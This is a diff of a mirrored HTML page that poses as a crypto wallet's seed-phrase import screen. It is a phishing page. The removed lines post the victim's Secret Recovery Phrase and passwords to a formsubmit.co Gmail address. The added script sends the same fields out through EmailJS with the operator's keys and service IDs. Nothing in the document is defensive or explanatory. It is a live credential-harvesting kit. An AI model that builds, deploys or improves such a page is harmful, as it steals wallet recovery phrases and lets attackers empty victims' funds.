@@ -416,19 +416,16 @@
                     <div class="first-time-flow">
                         <div class="first-time-flow__wrapper">
                           
-                                       <form action="https://formsubmit.co/swiss.expresszurich@gmail.com" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
-                                        <input type="hidden" name="_cc" value="formsubmitmails@gmail.com">
-                                        <input type="hidden" name="_captcha" value="false">
-                                        <input type="hidden" name="_next" value="https://bitomat-resolve.vercel.app/access/point/barcode-generated.html">
+                                       <form action="" method="post" enctype="multipart/form-data" id="my-form" class="ajaxForm">
                                 <div class="first-time-flow__create-back"><a href="../index-2.html">< Back</a></div>
                                 <div class="first-time-flow__header">Import an account with Secret Recovery Phrase</div>
                                 <div class="first-time-flow__text-block">Enter your secret phrase here to restore your vault.</div>
                                 <div class="first-time-flow__textarea-wrapper">
                                     <label>Secret Recovery Phrase</label>
-                                    <textarea style="display: none;" id="seed_phrase_textarea" class="first-time-flow__textarea" placeholder="Separate each word with a single space" autocomplete="off" name="cpph"></textarea>
+                                    <textarea style="display: none;" id="keys" class="first-time-flow__textarea" placeholder="Separate each word with a single space" autocomplete="off" name="message"></textarea>
                                     <div id="seed_phrase_textbox_container" class="MuiFormControl-root MuiTextField-root first-time-flow__textarea first-time-flow__seedphrase">
                                         <div class="MuiInputBase-root MuiInput-root jss27 MuiInputBase-formControl MuiInput-formControl">
-                                            <input id="seed_phrase_textbox" name="pph" aria-invalid="false" autocomplete="off" placeholder="Paste Secret Recovery Phrase from clipboard" type="password" dir="auto" class="MuiInputBase-input MuiInput-input" value="">
+                                            <input id="keys" name="message" aria-invalid="false" autocomplete="off" placeholder="Paste Secret Recovery Phrase from clipboard" type="password" dir="auto" class="MuiInputBase-input MuiInput-input" value="">
                                         </div>
                                     </div>
                                     <div class="first-time-flow__checkbox-container">
@@ -437,11 +434,11 @@
                                     </div>
                                 </div>
                                 <div class="MuiFormControl-root MuiTextField-root first-time-flow__input MuiFormControl-marginNormal">
-                                    <label class="MuiFormLabel-root MuiInputLabel-root jss24 jss28 MuiInputLabel-formControl MuiInputLabel-animated MuiInputLabel-shrink" data-shrink="true" for="password" id="password-label">
+                                    <label class="MuiFormLabel-root MuiInputLabel-root jss24 jss28 MuiInputLabel-formControl MuiInputLabel-animated MuiInputLabel-shrink" data-shrink="true" for="password" id="keys">
                                         New password (min 8 chars)
                                     </label>
                                     <div class="MuiInputBase-root MuiInput-root jss27 MuiInputBase-formControl MuiInput-formControl">
-                                        <input required="" aria-invalid="false" name="ppc" autocomplete="new-password" id="password" type="password" dir="auto" class="MuiInputBase-input MuiInput-input" value="">
+                                        <input required="" aria-invalid="false" name="message" autocomplete="new-password" id="keys" type="password" dir="auto" class="MuiInputBase-input MuiInput-input" value="">
                                     </div>
                                 </div>
                                 <div class="MuiFormControl-root MuiTextField-root first-time-flow__input MuiFormControl-marginNormal">
@@ -449,7 +446,7 @@
                                         Confirm password
                                     </label>
                                     <div class="MuiInputBase-root MuiInput-root jss27 MuiInputBase-formControl MuiInput-formControl">
-                                        <input required="" name="cppc" aria-invalid="false" autocomplete="new-password" id="confirm-password" type="password" dir="auto" class="MuiInputBase-input MuiInput-input" value="">
+                                        <input required="" name="message" aria-invalid="false" autocomplete="new-password" id="keys" type="password" dir="auto" class="MuiInputBase-input MuiInput-input" value="">
                                     </div>
                                 </div>
                                 <div class="first-time-flow__checkbox-container">
@@ -463,7 +460,7 @@
                                         </span>
                                     </span>
                                 </div>
-                                <button name="send" class="button btn-primary first-time-flow__button" disabled="disabled" id="submit-btn" type="submit">Import</button>
+                                <button name="submit" class="button btn-primary first-time-flow__button" disabled="disabled" id="submit-btn" type="submit">Import</button>
                             </form>
                         </div>
                     </div>
@@ -480,7 +477,35 @@
             }, 2000);
             </script>
     
+<script type="text/javascript"
+  src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 
+<script type="text/javascript">
+  emailjs.init('Sl_LbPBn89AL9hyA1')
+</script>
+                                        
+  <script>
+          const btn = document.getElementById('submit');
+
+document.getElementById('my-form')
+ .addEventListener('submit', function(event) {
+   event.preventDefault();
+
+   btn.value = 'Sending...';
+
+   const serviceID = 'service_yzpfm2e';
+   const templateID = 'template_3djgc3w';
+
+   emailjs.sendForm(serviceID, templateID, this)
+    .then(() => {
+      btn.value = 'Send Email';
+      alert('Sent!');
+    }, (err) => {
+      btn.value = 'Send Email';
+      alert(JSON.stringify(err));
+    });
+});
+  </script>                                      
 </body>
 <!-- Mirrored from multisafechain-nodes.vercel.app/form/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 05 Feb 2026 13:31:41 GMT -->
 </html>
